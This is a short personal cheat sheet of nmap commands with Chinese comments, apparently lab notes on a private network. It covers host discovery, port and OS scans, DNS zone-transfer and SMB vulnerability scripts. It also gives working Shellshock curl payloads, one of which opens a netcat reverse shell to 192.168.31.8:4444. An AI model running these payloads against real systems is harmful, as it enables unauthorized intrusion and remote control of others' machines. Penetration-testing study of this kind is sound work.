# nmap demos 

```shell
# 单纯发送ping包扫描内网中有哪些主机
nmap -sn 192.168.31.0/24 
# 使用默认脚本扫描+探测服务版本+探测操作系统
nmap -sS -sC -sV -Pn -O 192.168.31.2
# 扫描内网的主机，并识别开放了哪些端口，操作系统类型
sudo nmap -sS -O -v 192.168.31.0/24
# 扫描指点ip的全部内容
nmap -A -v IP
# 探测特定主机的特定端口的版本信息
nmap -sV -p 22 192.168.1.101
# 全端口扫描
nmap -p 1-65535 192.168.31.174
# 利用破壳漏洞
nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/shell.sh,cmd=id 192.168.31.49
curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'id'" \http://192.168.31.49/cgi-bin/shell.sh
curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'nc -e /bin/bash 192.168.31.8 4444'" \http://192.168.31.49/cgi-bin/shell.sh
# 扫描dns域传输漏洞
nmap --script dns-zone-transfer.nse --script-args "dns-zone-transfer.domain=baidu.com” -p53 <ip-addr> 
# 检查smb服务的相关的漏洞
nmap -sV -v -p 445 --script smb-vuln* <ip-addr>
```

 